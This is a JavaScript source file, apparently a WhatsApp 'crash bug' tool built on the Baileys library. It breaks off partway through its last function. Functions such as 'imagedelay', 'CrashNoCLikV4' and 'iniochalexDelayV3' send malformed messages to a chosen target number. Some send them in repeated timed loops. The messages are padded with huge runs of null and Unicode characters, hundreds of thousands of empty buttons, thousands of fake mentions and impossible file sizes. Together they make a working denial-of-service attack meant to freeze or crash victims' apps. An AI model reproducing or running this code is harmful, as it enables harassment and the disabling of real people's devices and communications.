const {
  default: makeWASocket,
  useMultiFileAuthState,
  generateWAMessageFromContent,
  makeInMemoryStore,
  prepareWAMessageMedia,
  generateWAMessage,
  areJidsSameUser,
  WAMessageStatus,
  AuthenticationState,
  GroupMetadata,
  getContentType,
  useSingleFileAuthState,
  BufferJSON,
  WAMessageProto,
  WAFlag,
  WANode,
  WAMetric,
  ChatModification,
  WALocationMessage,
  ReconnectMode,
  WAContextInfo,
  proto,
  WAGroupMetadata,
  ProxyAgent,
  waChatKey,
  MimetypeMap,
  MediaPathMap,
  WAContactMessage,
  WAContactsArrayMessage,
  WAGroupInviteMessage,
  WATextMessage,
  WAMessageContent,
  WAMessage,
  BaileysError,
  WA_MESSAGE_STATUS_TYPE,
  MediaConnInfo,
  URL_REGEX,
  WAUrlInfo,
  WA_DEFAULT_EPHEMERAL,
  WAMediaUpload,
  mentionedJid,
  processTime,
  Browser,
  MessageType,
  Presence,
  WA_MESSAGE_STUB_TYPES,
  Mimetype,
  relayWAMessage,
  Browsers,
  GroupSettingChange,
  DisconnectReason,
  WASocket,
  getStream,
  WAProto,
  isBaileys,
  AnyMessageContent,
  fetchLatestBaileysVersion,
  templateMessage,
  InteractiveMessage,
  Header,
  makeCacheableSignalKeyStore,
  encodeNewsletterMessage,
  patchMessageBeforeSending,
  encodeWAMessage,
  encodeSignedDeviceIdentity,
  jidEncode,
  jidDecode,
  getUSyncDevices,
  baileysLib
} = require("@whiskeysockets/baileys");

const express = require("express");
const crypto = require("crypto");
const app = express();
const TelegramBot = require("node-telegram-bot-api");
const fs = require("fs");
const path = require('path');
const pino = require('pino');
const P = require('pino');
const axios = require('axios');
const chalk = require('chalk');
const os = require('os');

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

async function imagedelay(sock, target) {
  await sock.relayMessage(target, {
    imageMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
      mimetype: "image/jpeg",
      fileSha256: "2eqLffA9IMphTt+iMq8k5QrWjpXajm8ZqJA9kk5JbDg=",
      fileLength: 9999,
      height: 9999,
      width: 9999,
      mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
      fileEncSha256: "aGfmY0rHUSe1eBmt1vkewywDKjUmnRjng3DfLhUMYAc=",
      directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
      mediaKeyTimestamp: "1776937541",
      jpegThumbnail: null,
      caption: "slashh-nocther.com" + "\u0000".repeat(450000),
      scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
      scanLengths: [
        9999999999999999999,
        9999999999999999999,
        9999999999999999999,
        9999999999999999999
      ],
      midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0=",
      contextInfo: {
        mentionedJid: Array.from({ length: 2000 }, () =>
          "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
        ),
        forwardingScore: 999999999,
        isForwarded: true
      }
    }
  }, {});

  await sock.relayMessage(target, {
    interactiveMessage: {
      header: {
        title: "GhostCrasher" + "ꦾ࣯".repeat(30000),
        hasMediaAttachment: true,
        documentMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7119-24/583550661_2366231810527044_2211533771736792774_n.enc?ccb=11-4&oh=01_Q5Aa4gE54f2r8LoDblReCmtq2DnGP-mSrNd-omujIcrP313Vlg&oe=6A3DBD88&_nc_sid=5e03e0&mms3=true",
          mimetype: "application/pdf",
          fileSha256: "7rOXceVPuGvMTfHN7VXURYOQV2ZmzxQ4xZ6cLM2JNPA=",
          fileLength: 999999999,
          pageCount: 1000,
          mediaKey: "oohdpzQ3uCjBvJWx+2VmRj4bWsCiTvrpUftezu27bs4=",
          fileName: "MakLo.pdf",
          fileEncSha256: "IT6Goux9voqfI50TST8rtFY9iVmxZenRz55JXZpAR2g=",
          directPath: "/v/t62.7119-24/583550661_2366231810527044_2211533771736792774_n.enc?ccb=11-4&oh=01_Q5Aa4gE54f2r8LoDblReCmtq2DnGP-mSrNd-omujIcrP313Vlg&oe=6A3DBD88&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1779839963",
          thumbnailDirectPath: "/v/t62.36145-24/705860036_1320514133375133_5228808273876536402_n.enc?ccb=11-4&oh=01_Q5Aa4gFkVLVWUFlX-Jk7uj1PdsnY5lmVp4lWmmQYdHkPsFhTUQ&oe=6A3DAF40&_nc_sid=5e03e0",
          thumbnailSha256: "xK2z7ScS2wSQDxLVfdZ5e1BpIe+GsTv8KaVGAfufqjY=",
          thumbnailEncSha256: "2N98oiJb8xii+D/KYAuHRq7Mg/8OIHFXNZQ5py4g9fM=",
          jpegThumbnail: null,
          thumbnailHeight: 999,
          thumbnailWidth: 999
        }
      },
      body: {
        text: "noctmodz.videy.co" + "\u0000".repeat(450000)
      },
      contextInfo: {
        mentionedJid: Array.from({ length: 2000 }, () =>
          "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
        ),
        forwardingScore: 999999999,
        isForwarded: true
      }
    }
  }, {});
}

async function topsvideo(sock, target) {
    const Video = [
        'https://h.top4top.io/m_39096s5a11.mp4',
        'https://i.top4top.io/m_39097lzk31.mp4',
        'https://j.top4top.io/m_3909esn5z1.mp4',
        'https://l.top4top.io/m_3909i44dn1.mp4'
    ];

    const random = (arr) => arr[Math.floor(Math.random() * arr.length)];

    const buildMessage = () => ({
        video: { url: random(Video) },
        mimetype: 'video/mp4'
    });

    const sender = async () => {
        await sock.sendMessage(target, buildMessage());
    };

    const runner = async () => {
        for (let i = 0; i < 5; i++) {
            await sender();
        }
    };

    return runner();
}

async function iniochalexDelayV3(sock, target) {
    const LexMsg = {
        interactiveMessage: {
            nativeFlowMessage: {
                buttons: [{
                    name: "payment_info",
                    buttonParamsJson: '{"currency":"IDR","total_amount":{"value":0,"offset":100},"reference_id":"\u0000' + Date.now() + '","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"' + '\u0000'.repeat(7500) + '","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"\u0000","key":"' + '\u0000'.repeat(7500) + '","key_type":"CPF"}}],"share_payment_status":false}'
                }]
            }
        }
    };

    const Nanas = {
        viewOnceMessage: {
            message: {
                videoMessage: {
                    mimetype: "video/mp4",
                    fileLength: "17381601",
                    title: "LexzyModss - Executed",
                    fileName: " done bos " + "ꦽ".repeat(75000),
                    fileSha256: "Jch1ImUydhA2vcB5auK8Dsc1jFHRN9ykhr2x5sr3X5c=",
                    fileEncSha256: "Jch1ImUydhA2vcB5auK8Dsc1jFHRN9ykhr2x5sr3X5c=",
                    mediaKey: "s4SdSzN3zwaZNv1+jcXtAQdCc8AIm879E9+CwdN8VfI2",
                    directPath: "/v/t62.7119-24/fake.enc",
                    mediaKeyTimestamp: "1767975195",
                    url: "https://mmg.whatsapp.net/d/fake.enc",
                    caption: "ꦾ".repeat(7000) + "ꦽ".repeat(7500)
                }
            }
        }
    };

    const Muda = {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    body: {
                        text: " Lexzy Suka Nanas " + "ꦾ".repeat(7500)
                    },
                    contextInfo: {
                        stanzaId: "metawai_id",
                        forwardingScore: 999,
                        participant: target,
                        mentionedJid: Array.from({ length: 2000 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net")
                    }
                }
            }
        }
    };

    const stickers = {
        stickerMessage: {
            url: 'https://mmg.whatsapp.net/m1/v/t24/An_qcbaV8YTP-HtiB1VFAie8c-VqF4bBnMHWKN--GFd6T2GW-pQwLHQe4K4eDKCS1Fv9DZCa6RXMDsLeabNqy8RoTIekx2LtJCM-iUtOu_sdK90zdCEu1l8Wwqj3KAHrNRd1?ccb=10-5&oh=01_Q5Aa4AEbsVLrEjUg9wGPpN5mT_DeeyZp0Obyl7Cp7X5CHZ4mSA&oe=69D77DE6&_nc_sid=5e03e0&mms3=true',
            fileSha256: 'lOzzPjzVDfakRkXD9ud+N/JGUHVsmn37eqDk0UijQdA=',
            fileEncSha256: "lOzzPjzVDfakRkXD9ud+N/JGUHVsmn37eqDk0UijQdA=",
            mediaKey: Buffer.alloc(32, '').toString('base64'),
            mimetype: "image/webp",
            height: -1,
            width: 5000,
            directPath: '/m1/v/t24/An_qcbaV8YTP-HtiB1VFAie8c-VqF4bBnMHWKN--GFd6T2GW-pQwLHQe4K4eDKCS1Fv9DZCa6RXMDsLeabNqy8RoTIekx2LtJCM-iUtOu_sdK90zdCEu1l8Wwqj3KAHrNRd1?ccb=10-5&oh=01_Q5Aa4AEbsVLrEjUg9wGPpN5mT_DeeyZp0Obyl7Cp7X5CHZ4mSA&oe=69D77DE6&_nc_sid=5e03e0',
            fileLength: null,
            mediaKeyTimestamp: 1710000000,
            firstFrameLength: 999,
            firstFrameSidecar: Buffer.from([99,88,77,66,55,44,33,22,11,0]),
            isAnimated: true,
            pngThumbnail: Buffer.from([99,88,77,66,55,44,33,22,11,0]),
            contextInfo: {
                mentionedJid: [
                    "0@s.whatsapp.net",
                    ...Array.from({ length: 1999 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")
                ],
                interactiveAnnotations: [{
                    polygonVertices: [
                        { x: 0.1, y: 0.1 },
                        { x: 0.9, y: 0.1 },
                        { x: 0.9, y: 0.9 },
                        { x: 0.1, y: 0.9 }
                    ],
                    location: {
                        latitude: -6.2088,
                        longitude: 106.8456,
                        name: `LexzyModss - Executed`,
                    }
                }]
            },
            stickerSentTs: 1710000000,
            isAvatar: true,
            isAiSticker: true,
            isLottie: true,
            accessibilityLabel: "\u0000".repeat(9000),
            mediaKeyDomain: null
        }
    };

    const msg = {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        imageMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7118-24/613381757_981708741479682_6415817420190586389_n.enc?ccb=11-4&oh=01_Q5Aa4AGbFJc4Yn7y_Y2gO_4l-ZyX1pyKJJpcCA_a-Wra2rY9SA&oe=69E62DD0&_nc_sid=5e03e0&mms3=true",
                            mimetype: "image/jpeg",
                            caption: "LexzyModss - Executed",
                            fileSha256: "umQsdlmP4w9dL35/1yb2Wy5x6ypLvSXUy3r7veQ/rNU=",
                            fileLength: "109951162777600",
                            height: -9999,
                            width: 9999,
                            mediaKey: "pbSAJfuBxe4QBnJO34YFyM1EX4ZABBJsmW6rhvT+5+I=",
                            fileEncSha256: "8frUJ7Tt5d1EXOSWiP/9CBdN4fP2gPV6WPE0sN/IaF4=",
                            directPath: "/v/t62.7118-24/613381757_981708741479682_6415817420190586389_n.enc?ccb=11-4&oh=01_Q5Aa4AGbFJc4Yn7y_Y2gO_4l-ZyX1pyKJJpcCA_a-Wra2rY9SA&oe=69E62DD0&_nc_sid=5e03e0",
                            mediaKeyTimestamp: "1774107894",
                            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHR0Jdi1hZV1hYjX2Xe5t7l33gsJycsOD/2c7Z////////////////CABEIAEgASAMBIgACEQEDEQH/xAAsAAACAwEBAAAAAAAAAAAAAAAABAIDBQEGAQEAAAAAAAAAAAAAAAAAAAAA/9oADAMBAAIQAxAAAADs6unZ2+aFh/SINqdLCYSpYVKXczcHeKUGr56zGNgaDMfrkKJRqNSqkK6GqjWFw2MvVwxefqbzzDetQJykmZZwN7KAS4BCYFYBYAf/xAAmEAACAgICAgICAgMAAAAAAAAAAAABAgADBBESIQUxE0EQIhVRFDJS/9oACAEBAAE/AMZx8C6BOjHNh2FYLMahbcieZzONYpT84PlOKCi0dSyxa9LqIgLgkghjKwyWWUoQBuGtQG5sd77ImGUVbmXrrqZFr22HcowL7hvWhKfFy/xj8eSiVs708XHa9SmsF+J+hL8T43589bjltDl2NzJ+RrErrMxvGog5v2ZUyceh6lj8VY+v6ldqvXLslVyyn0ejHL41kvJrX5LDt/oRG+Zi1nUutejJDfUGUciv46tciJUl+OCbWEttpyGPK4CZF6Y1YFL8pWWtvUnskyvhcnxuNv8AUFjWW7vmPWtzitCSvszyZqNhrXrgJiPwLkWFSB1C92WKyDsp7luG23ts/QQHdJQAe/crc1uCJjX/ACD9Tpx6lVdOhtTzMtv/AMBgoHuZdy3Wl1ErPFgSOopUNyrfUf5LG/d4QtSnrZldDPx69mFUotRFPcw6BShutP7N6nljuxGgx2sr5IjbleFmH1SZX4jKPtZ/DP8Adgn8SmxzumXirTim2pvUx2L5CFjvuZFyktYf9Elu7q3sJ+9zG7xqihUfrNjiQ1qw34y7DXiPm4Ce7Y3lcEelYzL8ul1DVJVMRwl6kiZALoKgd/bS0fHUR/UF1oGg7AQW2f8AZhJJjqi8eLb67/NTcXBn/8QAFBEBAAAAAAAAAAAAAAAAAAAAQP/aAAgBAgEBPwBP/8QAFBEBAAAAAAAAAAAAAAAAAAAAQP/aAAgBAwEBPwBP/9k=",
                            viewOnce: true,
                            scansSidecar: "ruEDZByywdU2+wxwAOMMI9TaQpJ84ehIk67v1KJjC+JGXu9u7ta4fw==",
                            scanLengths: [6677, 48757, 32501, 42353],
                            midQualityFileSha256: "qjGQcaOKUiN+pMKBMxAEeONhJR5VDFsu+iGxQ1LfmNY="
                        },
                        hasMediaAttachment: null
                    },
                    body: {
                        text: "\u0000".repeat(1000)
                    },
                    contextInfo: {
                        remoteJid: "status@broadcast",
                        participant: target,
                        isBuldo: true,
                        mentionedJid: [
                            "0@s.whatsapp.net",
                            ...Array.from({ length: 1000 * 40 }, () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net")
                        ],
                        groupMentions: [],
                        entryPointConversionSource: "non_contact",
                        entryPointConversionApp: "whatsapp",
                        entryPointConversionDelaySeconds: 467593,
                        quotedMessage: {
                            documentMessage: {
                                url: "https://example.com/file.zip",
                                mimetype: "application/zip",
                                caption: "LexzyModss - Executed",
                                fileName: "NanasMuda - Executed",
                                fileLength: 99999,
                                vCards: true
                            }
                        }
                    },
                    nativeFlowMessage: {
                        messageParamsJson: "ြ".repeat(9000)
                    }
                }
            }
        }
    };

    await sock.relayMessage("status@broadcast", Nanas, {
        messageId: null,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
            }]
        }]
    });

    await sock.relayMessage("status@broadcast", Muda, {
        messageId: null,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
            }]
        }]
    });

    const startTime = Date.now();
    const duration = 5 * 60 * 1500;

    while (Date.now() - startTime < duration) {
        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                message: {
                    extendedTextMessage: {
                        text: "\u0000".repeat(75000),
                        contextInfo: {
                            participant: target,
                            mentionedJid: [
                                "0@s.whatsapp.net",
                                ...Array.from({ length: 1950 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net")
                            ]
                        }
                    }
                }
            }
        }, { participant: target });
    }

    await sock.relayMessage(target, {
        groupStatusMessageV2: {
            nativeFlowMessage: {
                extendedTextMessage: {
                    text: "\u0003".repeat(9000),
                    contextInfo: {
                        participant: target,
                        mentionedJid: [
                            "0@s.whatsapp.net",
                            ...Array.from(
                                { length: 1999 },
                                () => "1" + Math.floor(Math.random() * 98000000) + "@s.whatsapp.net"
                            )
                        ]
                    }
                }
            }
        }
    }, { participant: target });

    const startTime2 = Date.now();
    const duration2 = 1 * 60 * 1000;

    while (Date.now() - startTime2 < duration2) {
        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                message: {
                    extendedTextMessage: {
                        text: "\u0003".repeat(75000),
                        contextInfo: {
                            participant: target,
                            mentionedJid: [
                                "0@s.whatsapp.net",
                                ...Array.from({ length: 2000 }, () => "1" + Math.floor(Math.random() * 8000000) + "@s.whatsapp.net")
                            ]
                        }
                    }
                }
            }
        }, { participant: target });
    }

    const LexzyyMsg = {
        interactiveMessage: {
            body: {
                text: "LexzyMods - Executed¿!",
            },
            nativeFlowMessage: {
                buttons: Array.from({ length: 700000 }, () => ({}))
            },
            contextInfo: {
                quotedMessage: {
                    orderMessage: {
                        orderTitle: "Pt Nanas Muda",
                        itemCount: 1999,
                        totalAmount1000: "1000000",
                        totalCurrencyCode: "IDR"
                    },
                },
            },
        },
    };

    const acamsg = generateWAMessageFromContent(target, LexzyyMsg, {});

    await sock.relayMessage(target, acamsg.message, {
        participant: target,
        messageId: acamsg.key.id
    });

    const Lexca = {
        messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
            botMetadata: {
                pluginMetadata: {},
                richResponseSourcesMetadata: {
                    sources: []
                }
            }
        },
        groupStatusMessageV2: {
            message: {
                richResponseMessage: {
                    messageType: 1,
                    submessages: [
                        {
                            messageType: 3,
                            tableMetadata: {
                                title: "LexzyMods - Executed¿!",
                                rows: Array.from({ length: 2000 }, () => ({}))
                            }
                        }
                    ],
                    unifiedResponse: {
                        data: JSON.stringify({
                            response_id: crypto.randomUUID(),
                            sections: []
                        })
                    },
                    contextInfo: {
                        forwardingScore: 1,
                        isForwarded: true,
                        forwardedAiBotMessageInfo: {
                            botJid: "NanasXExecutedXAllTeam"
                        },
                        forwardOrigin: 3
                    }
                }
            }
        }
    };

    const Lexcaa = generateWAMessageFromContent(target, Lexca, {});

    await sock.relayMessage(target, Lexcaa.message, {
        participant: target,
        messageId: Lexcaa.key.id
    });

    await sock.relayMessage(target, {
        interactiveMessage: {
            nativeFlowMessage: {
                buttons: [{
                    name: "payment_info",
                    buttonParamsJson: '{"currency":"IDR","total_amount":{"value":0,"offset":100},"reference_id":"\x10' + Date.now() + '","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"' + '\u0000'.repeat(7500) + '","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"\x10","key":"' + '\u0000'.repeat(7500) + '","key_type":"CPF"}}],"share_payment_status":false}'
                }]
            }
        }
    }, {});

    await sock.relayMessage(target, {
        view0nceMessageV2: {
            message: {
                extendedTextMessage: {
                    text: "\u0003".repeat(9000),
                    contextInfo: {
                        participant: target,
                        mentionedJid: [
                            "0@s.whatsapp.net",
                            ...Array.from(
                                { length: 2000 },
                                () => "5" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
                            )
                        ]
                    }
                }
            }
        }
    }, { participant: target });

    const Lexcabos = {
        groupStatusMessageV2: {
            message: {
                stickerPackMessage: {
                    stickerPackId: "\u0000".repeat(9000),
                    name: "LexzyMods - Executed¿!",
                    publisher: "\u0000".repeat(9000),
                    fileLength: 9999,
                    fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
                    fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
                    mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
                    mimetype: "image/webp",
                    directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
                    contextInfo: {
                        statusAttributionType: 2,
                        statusAttributions: Array.from({ length: 450000 }, () => ({ type: 1 }))
                    },
                },
            },
        },
    };

    await sock.relayMessage(target, Lexcabos, {
        participant: target,
    });

    const startTime3 = Date.now();
    const duration3 = 4 * 60 * 1000;
    while (Date.now() - startTime3 < duration3) {
        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                message: {
                    interactiveMessage: {
                        body: {
                            text: "Lexcaa - Executed¿!"
                        },
                        nativeFlowMessage: {
                            buttons: Array.from({ length: 500000 }, () => ({}))
                        },
                    },
                },
            },
        }, { participant: target });

        await new Promise(resolve => setTimeout(resolve, 500));

        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: "ExecutedTeam",
                            format: "DEFAULT"
                        },
                        nativeFlowResponseMessage: {
                            name: "call_permission_request",
                            paramsJson: "\u0003".repeat(9000),
                            version: 3
                        },
                    }
                }
            }
        }, { participant: target });

        await new Promise(resolve => setTimeout(resolve, 500));

        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: "NanasMuda - Executed‽!",
                            format: "DEFAULT"
                        },
                        nativeFlowResponseMessage: {
                            name: "galaxy_message",
                            paramsJson: "\x10".repeat(9000),
                            version: 3
                        },
                    }
                }
            }
        }, { participant: target });

        await new Promise(resolve => setTimeout(resolve, 500));

        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: "Lexcaabos - Executed¿!",
                            format: "DEFAULT"
                        },
                        nativeFlowResponseMessage: {
                            name: "address_message",
                            paramsJson: `{"values":{"in_pin_code":"xxx","building_name":"xxx","landmark_area":"X","address":"xxx","tower_number":"mmklu","city":"porno","name":"crb","phone_number":"xxx","house_number":"xxx","floor_number":"xxx","state":"yandex | ${"\u0000".repeat(9000)}"}}`,
                            version: 3
                        },
                        contextInfo: {
                            quotedMessage: {
                                paymentInviteMessage: {
                                    serviceType: 2,
                                    expiryTimestamp: Math.floor(Date.now() / 1999) + 8640000
                                }
                            }
                        }
                    }
                }
            }
        }, { participant: target });

        await new Promise(resolve => setTimeout(resolve, 500));

        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                message: {
                    extendedTextMessage: {
                        text: "\u0003".repeat(9000),
                        contextInfo: {
                            participant: target,
                            mentionedJid: [
                                "0@s.whatsapp.net",
                                ...Array.from(
                                    { length: 1999 },
                                    () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
                                )
                            ]
                        }
                    }
                }
            }
        }, { participant: target });
    }

    const LexzyExe = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "LexzyMods - Executed¿!"
                    },
                    nativeFlowMessage: {
                        buttons: "{}".repeat(75000),
                    },
                },
            },
        },
    };

    const Lexx = generateWAMessageFromContent(target, LexzyExe, {});

    await sock.relayMessage(target, Lexx.message, {
        participant: target,
        messageId: Lexx.key.id
    });

    const ocha = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "Lexcaabos - Executed¿!",
                    },
                    nativeFlowMessage: {
                        buttons: "[".repeat(75000),
                    },
                },
            },
        },
    };

    const iniocha = generateWAMessageFromContent(target, ocha, {});

    await sock.relayMessage(target, iniocha.message, {
        participant: target,
        messageId: iniocha.key.id
    });

    await sock.relayMessage(target, {
        groupStatusMessageV2: {
            nativeFlowMessage: {
                extendedTextMessage: {
                    text: "\u0003".repeat(9000),
                    contextInfo: {
                        participant: target,
                        mentionedJid: [
                            "0@s.whatsapp.net",
                            ...Array.from(
                                { length: 1999 },
                                () => "1" + Math.floor(Math.random() * 98000000) + "@s.whatsapp.net"
                            )
                        ]
                    }
                }
            }
        }
    }, { participant: target });

    const LexzyyMsg2 = {
        interactiveMessage: {
            body: {
                text: "LexzyMods - Executed¿!",
            },
            nativeFlowMessage: {
                buttons: Array.from({ length: 700000 }, () => ({}))
            },
            contextInfo: {
                quotedMessage: {
                    orderMessage: {
                        orderTitle: "Pt Nanas Muda",
                        itemCount: 1999,
                        totalAmount1000: "1000000",
                        totalCurrencyCode: "IDR"
                    },
                },
            },
        },
    };

    const acamsg2 = generateWAMessageFromContent(target, LexzyyMsg2, {});

    await sock.relayMessage(target, acamsg2.message, {
        participant: target,
        messageId: acamsg2.key.id
    });
}

async function BlankMaklo(sock, target) {
    await sock.relayMessage(target, {
        interactiveMessage: {
            nativeFlowMessage: {
                buttons: [{
                    name: "payment_info",
                    buttonParamsJson: '{"currency":"IDR","total_amount":{"value":0,"offset":100},"reference_id":"\x10' + Date.now() + '","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"' + '\u2065'.repeat(7500) + '","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"bank_transfer","bank_transfer":{"merchant_name":"\x10","key":"' + '\u0003'.repeat(9000) + '","key_type":"CPF"}}],"share_payment_status":false}'
                }]
            }
        }
    }, {});
}

async function CrashNoCLikV4(sock, target) {
const aAsw = {
groupStatusMessageV2: {
message: {
interactiveMessage: {
header: {
title: "GhostCrasherl",
hasMediaAttachment: true,
documentMessage: {
url: "https://mmg.whatsapp.net/v/t62.7119-24/583550661_2366231810527044_2211533771736792774_n.enc?ccb=11-4&oh=01_Q5Aa4gE54f2r8LoDblReCmtq2DnGP-mSrNd-omujIcrP313Vlg&oe=6A3DBD88&_nc_sid=5e03e0&mms3=true",
mimetype: "application/pdf",
fileSha256: "7rOXceVPuGvMTfHN7VXURYOQV2ZmzxQ4xZ6cLM2JNPA=",
fileLength: 999999999,
pageCount: 1000,
mediaKey: "oohdpzQ3uCjBvJWx+2VmRj4bWsCiTvrpUftezu27bs4=",
fileName: "nando.pdf",
fileEncSha256: "IT6Goux9voqfI50TST8rtFY9iVmxZenRz55JXZpAR2g=",
directPath: "/v/t62.7119-24/583550661_2366231810527044_2211533771736792774_n.enc?ccb=11-4&oh=01_Q5Aa4gE54f2r8LoDblReCmtq2DnGP-mSrNd-omujIcrP313Vlg&oe=6A3DBD88&_nc_sid=5e03e0",
mediaKeyTimestamp: "1779839963",
thumbnailDirectPath: "/v/t62.36145-24/705860036_1320514133375133_5228808273876536402_n.enc?ccb=11-4&oh=01_Q5Aa4gFkVLVWUFlX-Jk7uj1PdsnY5lmVp4lWmmQYdHkPsFhTUQ&oe=6A3DAF40&_nc_sid=5e03e0",
thumbnailSha256: "xK2z7ScS2wSQDxLVfdZ5e1BpIe+GsTv8KaVGAfufqjY=",
thumbnailEncSha256: "2N98oiJb8xii+D/KYAuHRq7Mg/8OIHFXNZQ5py4g9fM=",
jpegThumbnail: null,
contextInfo: {},
thumbnailHeight: 999,
thumbnailWidth: 999
}
},
body: {
text: "Skylinne!",
},
nativeFlowMessage: {
 buttons: Array.from({ length: 500000 }, () => ({}))
}
}
}
}
};

const iVCs = generateWAMessageFromContent(target, aAsw, {});

await sock.relayMessage(target, iVCs.message, {
// participant: true,
messageId: iVCs.key.id
})
}

async function k7ForceInfinity(sock, target, durationHours = 1) {
    const totalDurationMs = durationHours * 3600000;
    const startTime = Date.now();
    let count = 0;
    const mentionedTags = [
        [0xBA, 0x03],
        [0xD2, 0x04],
        [0xAA, 0x02]
    ];

    const encodeVarint = (n) => {
        const buf = [];
        while (n >= 0x80) {
            buf.push((n & 0x7f) | 0x80);
            n >>>= 7;
        }
        buf.push(n);
        return Buffer.from(buf);
    };

    const numberrendyr = function(raw) {
        var s = String(raw || '').trim();
        if (s.includes('@')) return s;
        return s.replace(/\D/g, '') + '@s.whatsapp.net';
    };

    const targetMention = (Array.isArray(target) ? target : [target])
        .map(numberrendyr)
        .filter(function(j) { return j.length > 15; });

    if (!targetMention.length) return;

    const AsilentKing = (tag, data) => Buffer.concat([Buffer.from(tag), encodeVarint(data.length), data]);

    const Asilentmsgimage = proto.Message.encode(
        proto.Message.fromObject({
            imageMessage: {
                url: "https://mmg.whatsapp.net/o1/v/t24/f2/m235/AQNoT0RVMsuqbGex4OAhCfu4uJgG8NDGShMN2WvxFxGEKQIN9AiuElv-4a6btmTyzbCYvvc6h-WsBx2srRxEA8LMPxWi_qtr6MvQV73Meg?ccb=9-4&oh=01_Q5Aa5AGLJ8RxEGZ7pZhWUQzr6gaFzyzpge4GNToAX6gKki2QZQ&oe=6A9602BA&_nc_sid=e6ed6c&mms3=true",
                directPath: "/o1/v/t24/f2/m235/AQNoT0RVMsuqbGex4OAhCfu4uJgG8NDGShMN2WvxFxGEKQIN9AiuElv-4a6btmTyzbCYvvc6h-WsBx2srRxEA8LMPxWi_qtr6MvQV73Meg?ccb=9-4&oh=01_Q5Aa5AGLJ8RxEGZ7pZhWUQzr6gaFzyzpge4GNToAX6gKki2QZQ&oe=6A9602BA&_nc_sid=e6ed6c",
                mediaKey: "xD3KegXJnRDJbL89tyWMpG1m12+jAXgXKN0XhTS0riM=",
                fileEncSha256: "ef7Y+a5ufhg2pfcsfZ23SYE4vUNtyoc3j/8/yyqr58Q=",
                fileSha256: "84cNaVGkzmIJwjozrUJipNbXoNb0ovMC8OWBMpLRcYU=",
                fileLength: 9100,
                mediaKeyTimestamp: "1785637793",
                mimetype: "image/jpeg",
                height: 1600,
                width: 1200,
                scanLength: [8177, 8118, 9117, 818],
